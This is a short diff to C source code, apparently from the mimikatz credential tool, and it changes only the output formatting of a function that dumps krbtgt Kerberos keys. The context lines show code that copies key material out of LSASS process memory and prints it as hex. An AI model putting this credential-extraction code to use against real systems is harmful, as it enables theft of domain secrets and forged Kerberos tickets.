@@ -469,15 +469,15 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 						kprintf(L"%u credentials\n", creds5->cbCred);
 						for(i = 0; i < creds5->cbCred; i++)
 						{
-							kprintf(L"> %s - ", kuhl_m_kerberos_ticket_etype((LONG) creds5->credentials[i].type));
+							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype((LONG) creds5->credentials[i].type));
 							aLsass.address = creds5->credentials[i].key;
 							if(aLocal.address = LocalAlloc(LPTR, (DWORD) creds5->credentials[i].size))
 							{
 								if(kull_m_memory_copy(&aLocal, &aLsass, (DWORD) creds5->credentials[i].size))
 									kull_m_string_wprintf_hex(aLocal.address, (DWORD) creds5->credentials[i].size, 0);
-								kprintf(L"\n");
 								LocalFree(aLocal.address);
 							}
+							kprintf(L"\n");
 						}
 					}
 					LocalFree(creds5);
@@ -498,15 +498,15 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 						kprintf(L"%u credentials\n", creds6->cbCred);
 						for(i = 0; i < creds6->cbCred; i++)
 						{
-							kprintf(L"> %s - ", kuhl_m_kerberos_ticket_etype((LONG) creds6->credentials[i].type));
+							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype((LONG) creds6->credentials[i].type));
 							aLsass.address = creds6->credentials[i].key;
 							if(aLocal.address = LocalAlloc(LPTR, (DWORD) creds6->credentials[i].size))
 							{
 								if(kull_m_memory_copy(&aLocal, &aLsass, (DWORD) creds6->credentials[i].size))
 									kull_m_string_wprintf_hex(aLocal.address, (DWORD) creds6->credentials[i].size, 0);
-								kprintf(L"\n");
 								LocalFree(aLocal.address);
 							}
+							kprintf(L"\n");
 						}
 					}
 					LocalFree(creds6);
